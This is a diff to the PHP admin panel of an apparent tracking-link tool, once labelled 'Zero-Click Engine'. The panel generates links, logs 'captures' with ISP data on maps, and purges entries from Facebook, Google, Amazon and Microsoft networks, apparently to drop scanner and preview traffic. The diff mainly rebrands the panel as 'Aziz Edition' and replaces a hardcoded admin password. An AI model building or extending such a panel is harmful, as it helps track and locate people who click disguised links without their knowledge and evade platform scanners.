@@ -27,7 +27,7 @@ try {
 
     $adminExists = $db->query("SELECT COUNT(*) FROM users WHERE role = 'azeez'")->fetchColumn();
     if (!$adminExists) {
-        $hash = password_hash('aziz123', PASSWORD_DEFAULT);
+        $hash = password_hash('0552380963', PASSWORD_DEFAULT);
         $db->prepare("INSERT INTO users (username, password, role, tg_chat) VALUES ('admin', ?, 'admin', '6475721500')")->execute([$hash]);
     }
 
@@ -310,7 +310,6 @@ if ($is_logged_in) {
     }
 
     if ($is_admin) {
-        // تغيير كلمة مرور الزملاء
         if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['admin_change_user_pass'])) {
             $target_user_id = intval($_POST['target_user_id']);
             $new_pass = $_POST['admin_new_password'];
@@ -320,7 +319,6 @@ if ($is_logged_in) {
                 header("Location: /?msg=pass_changed"); exit();
             }
         }
-        // إضافة مستخدم
         if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['add_user'])) {
             $new_user = trim($_POST['new_username']);
             $new_pass = password_hash($_POST['new_password'], PASSWORD_DEFAULT);
@@ -330,7 +328,6 @@ if ($is_logged_in) {
                 header("Location: /?msg=user_added"); exit();
             } catch (Exception $e) { $user_error = "اسم المستخدم موجود مسبقاً!"; }
         }
-        // حذف مستخدم
         if (isset($_GET['delete_user'])) {
             $del_uid = intval($_GET['delete_user']);
             if ($del_uid !== $current_user_id) {
@@ -341,7 +338,6 @@ if ($is_logged_in) {
         }
     }
 
-    // حذف سجلات
     if (isset($_GET['purge_bots']) && $is_admin) {
         $db->exec("DELETE FROM captures WHERE isp_info LIKE '%Facebook%' OR isp_info LIKE '%Google%' OR isp_info LIKE '%Amazon%' OR isp_info LIKE '%Microsoft%'");
         header("Location: /?msg=purged"); exit();
@@ -353,7 +349,6 @@ if ($is_logged_in) {
         header("Location: /"); exit();
     }
 
-    // توليد رابط
     $generated_link = ""; $generated_code = "";
     if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
         $target_url = trim($_POST['target_url']);
@@ -369,7 +364,6 @@ if ($is_logged_in) {
         $generated_code = $code;
     }
 
-    // الإحصائيات
     if ($is_admin) {
         $total_links = $db->query("SELECT COUNT(*) FROM links")->fetchColumn();
         $total_captures = $db->query("SELECT COUNT(*) FROM captures")->fetchColumn();
@@ -381,7 +375,6 @@ if ($is_logged_in) {
         $today_captures = $db->query("SELECT COUNT(*) FROM captures c JOIN links l ON c.code = l.code WHERE l.user_id = $current_user_id AND date(c.created_at) = date('now')")->fetchColumn();
     }
 
-    // السجلات
     $filter_code = trim($_GET['track'] ?? '');
     if ($is_admin) {
         if (!empty($filter_code)) { $stmt = $db->prepare("SELECT * FROM captures WHERE code = ? ORDER BY id DESC"); $stmt->execute([$filter_code]); }
@@ -398,7 +391,7 @@ if ($is_logged_in) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Control Panel</title>
+    <title>Control Panel - Aziz Edition</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
@@ -483,6 +476,13 @@ if ($is_logged_in) {
         
         .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%) translateY(100px); background: var(--success); color: white; padding: 12px 24px; border-radius: 8px; font-weight: bold; transition: 0.3s; z-index: 9999; opacity: 0; }
         .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
+
+        /* Custom Footer Animation */
+        @keyframes pulseGlow {
+            0% { filter: drop-shadow(0 0 2px var(--accent)); }
+            50% { filter: drop-shadow(0 0 10px var(--accent)); }
+            100% { filter: drop-shadow(0 0 2px var(--accent)); }
+        }
     </style>
 </head>
 <body>
@@ -497,6 +497,13 @@ if ($is_logged_in) {
                 <div class="form-group"><input type="password" name="password" placeholder="كلمة المرور" required></div>
                 <button type="submit" name="login" class="btn btn-block">دخول</button>
             </form>
+            <!-- البصمة في صفحة الدخول -->
+            <div style="text-align: center; margin-top: 30px;">
+                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="animation: pulseGlow 2s infinite;">
+                    <path d="M12 2a10 10 0 0 1 10 10c0 3.5-1.5 7-4 9.5"/><path d="M12 2a10 10 0 0 0-10 10c0 3.5 1.5 7 4 9.5"/><path d="M12 6a6 6 0 0 1 6 6c0 2.5-1 5-3 7"/><path d="M12 6a6 6 0 0 0-6 6c0 2.5 1 5 3 7"/><path d="M12 10a2 2 0 0 1 2 2c0 2-1 4-2 6"/><path d="M12 10a2 2 0 0 0-2 2c0 2 1 4 2 6"/>
+                </svg>
+                <p style="font-size: 11px; color: var(--muted); margin-top: 5px;">Developed by <span style="color: var(--accent); font-weight: bold;">AZIZ</span></p>
+            </div>
         </div>
     </div>
 <?php else: ?>
@@ -506,7 +513,7 @@ if ($is_logged_in) {
         <aside class="sidebar">
             <div class="sidebar-header">
                 <h2>Control Panel</h2>
-                <p>Zero-Click Engine V12.1</p>
+                <p>Aziz Edition</p>
             </div>
             
             <!-- الأزرار -->
@@ -715,6 +722,24 @@ if ($is_logged_in) {
 <?php endif; ?>
 
 <div class="toast" id="toast">✅ تم النسخ بنجاح!</div>
+
+<!-- ✅ البصمة والتوقيع أسفل الموقع -->
+<footer style="text-align: center; padding: 20px; border-top: 1px solid var(--border); background: var(--sidebar-bg); margin-top: auto;">
+    <div style="display: flex; align-items: center; justify-content: center; gap: 10px; flex-direction: column;">
+        <!-- Digital Fingerprint SVG -->
+        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="animation: pulseGlow 2s infinite;">
+            <path d="M12 2a10 10 0 0 1 10 10c0 3.5-1.5 7-4 9.5"/>
+            <path d="M12 2a10 10 0 0 0-10 10c0 3.5 1.5 7 4 9.5"/>
+            <path d="M12 6a6 6 0 0 1 6 6c0 2.5-1 5-3 7"/>
+            <path d="M12 6a6 6 0 0 0-6 6c0 2.5 1 5 3 7"/>
+            <path d="M12 10a2 2 0 0 1 2 2c0 2-1 4-2 6"/>
+            <path d="M12 10a2 2 0 0 0-2 2c0 2 1 4 2 6"/>
+        </svg>
+        <p style="color: var(--muted); font-size: 13px; font-weight: 500; letter-spacing: 0.5px;">
+            Developed by <span style="color: var(--accent); font-weight: bold; text-shadow: 0 0 8px var(--accent);">AZIZ</span> &copy; 2026
+        </p>
+    </div>
+</footer>
 
 <script>
     // التبديل بين التبويبات
